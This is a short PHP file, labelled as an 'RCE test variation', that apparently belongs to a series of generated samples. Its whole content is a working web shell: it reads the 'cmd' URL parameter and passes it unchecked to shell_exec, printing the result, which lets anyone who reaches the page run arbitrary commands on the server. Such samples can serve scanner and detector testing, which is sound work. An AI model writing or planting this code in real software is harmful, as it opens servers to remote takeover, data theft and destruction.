<?php
// RCE test variation #1356
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>